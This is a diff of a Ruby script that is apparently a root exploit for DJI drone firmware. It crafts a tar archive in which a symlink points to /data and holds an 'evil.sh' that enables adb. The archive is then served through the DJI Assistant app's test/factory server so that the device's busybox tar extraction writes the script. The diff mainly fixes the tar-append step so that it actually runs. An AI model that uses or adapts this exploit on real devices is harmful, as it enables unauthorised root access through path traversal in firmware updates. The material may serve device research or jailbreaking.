@@ -97,8 +97,14 @@ trap 'INT' do server.shutdown end
 # Debug with:
 # while true; do adb pull /ftp/upgrade/data_copy.bin data_copy.bin; done
 
-system("rm bug.tar")
-system("rm -rf symlink")
+# The bug being exploited is in the 'dji_sys' binary
+#  busybox strings /system/bin/dji_sys | grep "tar "
+#  busybox tar -xvf %s -C %s
+#  tar results: %s
+#  ..
+#  busybox tar -xf %s -C %s
+
+system("rm -rf symlink anything.txt bug.tar")
 system("echo 'get root' > anything.txt")
 system("tar cvf bug.tar anything.txt")
 system("ln -s /data symlink")
@@ -109,7 +115,8 @@ system("mkdir -p symlink")
 adbensh = 
 "#!/system/bin/sh\n/system/bin/adb_en.sh\n"
 File.open("symlink/evil.sh", 'w') {|f| f.write(adbensh) }
-%[tar --append -f bug.tar symlink/evil.sh]
+system("tar --append -f bug.tar symlink/evil.sh")
+system("tar --list -f bug.tar")
 
 pid = spawn("/Applications/Assistant_1_1_0.app/Contents/MacOS/Assistant --test_server --factory")
 Process.detach(pid)
